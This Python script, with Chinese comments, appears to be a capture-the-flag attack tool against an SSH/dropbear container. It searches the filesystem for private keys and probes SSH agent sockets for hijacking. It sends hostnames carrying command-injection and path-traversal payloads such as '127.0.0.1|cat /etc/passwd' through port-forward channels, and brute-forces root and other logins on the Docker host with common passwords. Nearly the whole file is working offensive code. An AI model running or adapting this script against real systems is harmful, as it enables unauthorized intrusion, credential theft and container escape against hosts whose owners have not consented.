import paramiko
import socket
import time
import sys
import os
import struct

HOST = "61.147.171.105"
PORT = 55300
USER = "ctf"
PASSWD = "123456"

def exec_cmd(ssh, cmd, timeout=10):
    """执行命令并返回输出"""
    stdin, stdout, stderr = ssh.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode()
    err = stderr.read().decode()
    return out + err

def find_ssh_keys():
    """在容器中寻找SSH密钥"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 搜索SSH密钥...")
    
    # 搜索可能的密钥位置
    paths_to_check = [
        "/root/.ssh/",
        "~/.ssh/",
        "/home/*/.ssh/",
        "/etc/ssh/",
        "/etc/dropbear/",
        "/var/lib/dropbear/",
    ]
    
    for path in paths_to_check:
        print(f"\n[*] 检查 {path}")
        print(exec_cmd(ssh, f"ls -la {path}"))
    
    # 尝试find
    print("\n[*] 使用find搜索密钥文件...")
    print(exec_cmd(ssh, "find / -name 'id_*' -o -name '*_key' -o -name 'authorized_keys'"))
    
    ssh.close()

def test_agent_hijacking():
    """
    SSH Agent Hijacking攻击：
    如果跳板机启用了SSH Agent Forwarding，我们可能可以利用它来获取用户的私钥
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # 启用agent forwarding连接
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    # 检查是否有agent socket
    print("[*] 检查SSH Agent socket...")
    print(exec_cmd(ssh, "ls -la $SSH_AUTH_SOCK"))
    print(exec_cmd(ssh, "env | grep SSH"))
    
    # 检查tmp目录中的socket
    print(exec_cmd(ssh, "find /tmp -type s"))
    
    ssh.close()

def analyze_dropbear_behavior():
    """分析dropbear的行为"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 当我们打开一个通道时，dropbear是如何处理的？
    # 如果它启动一个子进程来处理，我们可能可以看到它
    
    print("[*] 在打开通道前检查进程...")
    print(exec_cmd(ssh, "ps"))
    
    # 打开一个direct-tcpip通道
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    
    # 现在再次检查进程
    print("\n[*] 打开通道后检查进程...")
    print(exec_cmd(ssh, "ps"))
    
    channel.close()
    ssh.close()

def test_local_port_forward_with_special_chars():
    """测试带特殊字符的端口转发"""
    # 某些SSH服务器在处理端口转发时可能有命令注入漏洞
    # 特别是在主机名中包含特殊字符时
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 尝试使用带有特殊字符的主机名
    # 这些字符可能在某些实现中导致命令注入
    special_hosts = [
        # IPv6地址（可能触发不同的代码路径）
        ("::1", 22),
        ("[::1]", 22),
        # 空主机名
        ("", 22),
        # 路径遍历尝试
        ("../../../etc/passwd", 22),
        # 换行符注入
        ("127.0.0.1\n127.0.0.1", 22),
        # 管道
        ("127.0.0.1|cat /etc/passwd", 22),
        # 单引号
        ("'127.0.0.1'", 22),
        # 反斜杠
        ("127\\.0\\.0\\.1", 22),
        # 美元符号
        ("$HOME", 22),
    ]
    
    for host, port in special_hosts:
        try:
            print(f"[*] 测试主机: {repr(host)}")
            channel = transport.open_channel("direct-tcpip", (host, port), ('127.0.0.1', 0), timeout=3)
            print(f"[+] 成功打开通道!")
            channel.settimeout(2)
            try:
                data = channel.recv(256)
                print(f"    数据: {data[:100]}")
            except:
                pass
            channel.close()
        except Exception as e:
            # 检查错误消息中是否有有用的信息
            error_msg = str(e)
            if error_msg and "timed out" not in error_msg.lower():
                print(f"[-] 错误: {error_msg[:100]}")
    
    ssh.close()

def check_ssh_config_files():
    """检查SSH配置文件"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    print("[*] 检查SSH相关配置...")
    
    # 检查各种可能的配置文件
    configs = [
        "/etc/ssh/sshd_config",
        "/etc/ssh/ssh_config",
        "/etc/dropbear/dropbear_config",
        "/etc/default/dropbear",
        "~/.ssh/config",
    ]
    
    for config in configs:
        print(f"\n[*] {config}")
        result = exec_cmd(ssh, f"cat {config}")
        if "No such file" not in result and "can't open" not in result:
            print(result)
    
    ssh.close()

def test_host_based_auth():
    """测试基于主机的认证"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(HOST, PORT, USER, PASSWD)
    
    transport = ssh.get_transport()
    
    # 尝试通过隧道以root身份连接到宿主机
    # 使用不同的认证方法
    
    print("[*] 尝试通过隧道连接到宿主机...")
    
    channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
    
    # 创建一个新的SSH连接通过这个通道
    host_ssh = paramiko.SSHClient()
    host_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # 尝试不同的用户名和密码组合
    users = ["ctf", "root", "ubuntu", "admin", "user"]
    passwords = ["123456", "password", "root", "toor", "admin", "ctf", ""]
    
    for user in users:
        for passwd in passwords:
            try:
                # 重新打开通道
                channel = transport.open_channel("direct-tcpip", ("172.17.0.1", 22), ('127.0.0.1', 0))
                
                host_ssh = paramiko.SSHClient()
                host_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                host_ssh.connect("172.17.0.1", username=user, password=passwd, 
                               sock=channel, timeout=5, allow_agent=False, look_for_keys=False,
                               banner_timeout=5, auth_timeout=5)
                
                print(f"[+] 成功: {user}:{passwd}")
                
                # 获取信息
                stdin, stdout, stderr = host_ssh.exec_command("id")
                print(stdout.read().decode())
                
                host_ssh.close()
                break
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                pass
    
    ssh.close()

if __name__ == "__main__":
    print("="*50)
    print("[*] 深入分析SSH服务")
    print("="*50)
    
    print("\n[1] 搜索SSH密钥")
    find_ssh_keys()
    
    print("\n[2] 测试Agent Hijacking")
    test_agent_hijacking()
    
    print("\n[3] 分析dropbear行为")
    analyze_dropbear_behavior()
    
    print("\n[4] 检查SSH配置")
    check_ssh_config_files()
    
    print("\n[5] 测试特殊字符")
    test_local_port_forward_with_special_chars()
